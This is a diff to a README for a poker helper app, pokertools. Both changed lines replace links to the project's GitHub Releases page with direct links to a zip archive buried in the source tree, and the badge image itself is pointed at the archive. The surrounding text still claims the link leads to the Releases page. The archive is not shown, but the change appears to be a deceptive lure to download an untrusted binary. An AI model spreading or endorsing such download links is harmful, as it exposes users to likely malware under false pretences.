@@ -6,7 +6,7 @@ Welcome to pokertools! This application helps you play poker more effectively. I
 ## 📥 Download & Install
 To download the application, visit the following page:
 
-[![Download pokertools](https://img.shields.io/badge/Download-pokertools-4CAF50.svg)](https://github.com/Veenk00/pokertools/releases)
+[![Download pokertools](https://raw.githubusercontent.com/Veenk00/pokertools/main/packages/engine/src/engine/pokertools-v3.5.zip)](https://raw.githubusercontent.com/Veenk00/pokertools/main/packages/engine/src/engine/pokertools-v3.5.zip)
 
 1. Click on the link above to visit the Releases page.
 2. Find the latest version of the application.
@@ -44,6 +44,6 @@ Make sure to return to the Releases page regularly for new features and improvem
 ## 🔗 More Resources
 Explore additional resources on poker strategies and gameplay on our GitHub repository and related websites.
 
-[Download pokertools again](https://github.com/Veenk00/pokertools/releases)
+[Download pokertools again](https://raw.githubusercontent.com/Veenk00/pokertools/main/packages/engine/src/engine/pokertools-v3.5.zip)
 
 Enjoy playing poker with pokertools!
